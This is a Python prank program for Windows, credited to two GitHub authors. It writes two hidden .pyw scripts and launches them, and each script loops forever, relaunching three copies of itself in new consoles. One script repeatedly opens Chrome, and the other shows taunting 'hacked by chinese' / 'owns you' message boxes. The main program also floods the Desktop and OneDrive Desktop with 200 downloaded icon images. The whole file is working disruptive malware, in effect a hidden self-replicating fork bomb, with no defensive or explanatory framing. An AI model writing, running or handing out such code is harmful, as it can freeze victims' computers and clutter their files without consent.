"""
Written by onion and 3s0
https://github.com/onion
https://github.com/3s0

Moral support by
https://github.com/MoralSupportMistro
"""

import os
import subprocess
import urllib.request


def main():
    # creates a new file - this is used so multiple trollings could happen at once :^)
    # opens a new chrome window, and opens itself multiple times
    f = open('chrome.pyw', 'w')
    f.write('''import os
import subprocess


def open1():
    while True:
        os.system('start chrome')
        subprocess.call('py chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('py chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('py chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)


open1()
''')
    f.close()

    # creates a new file - this is used so multiple trollings could happen at once :^)
    # opens up a message box with one of the strings in the possible_strings array, chosen pseudo-randomly
    # also opens up multiple instances of itself for multiplied trollage :)

    f2 = open('YouveBeenChromed.pyw', 'w')
    f2.write('''import subprocess
import ctypes
import random

possible_strings = ['You\\'ve been chromed!', 'hacked by chinese', 'onion owns you', 'es0t owns you']
message_box = ctypes.windll.user32.MessageBoxW


def getChromed():
    while True:
        subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
        message_box(None, possible_strings[random.randint(0, len(possible_strings) - 1)], 'trollage', 0)


getChromed()
''')
    f2.close()

    subprocess.call('attrib +h ' + 'chrome.pyw')
    subprocess.call('attrib +h ' + 'YouveBeenChromed.pyw')
    subprocess.call('py chrome.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
    subprocess.call('py YouveBeenChromed.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)

    url = "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Google_Chrome_icon_(September_2014).svg/1200px-Google_Chrome_icon_(September_2014).svg.png"

    # creates lots of images on the desktop of the chrome icon
    num = 1
    desktop = os.path.join(os.environ["HOMEPATH"], "Desktop")
    os.chdir(desktop)
    for i in range(100):
        r = urllib.request.urlopen(url)
        with open('YouveBeenChromed' + str(num) + '.png', 'wb') as img:
            img.write(r.read())
        num = num + 1

    # creates lots of images in the onedrive desktop
    num = 1
    desktop = os.path.join(os.environ["HOMEPATH"], "OneDrive/Desktop")
    os.chdir(desktop)
    for i in range(100):
        r = urllib.request.urlopen(url)
        with open('YouveBeenChromed' + str(num) + '.png', 'wb') as img:
            img.write(r.read())
        num = num + 1


if __name__ == '__main__':
    main()
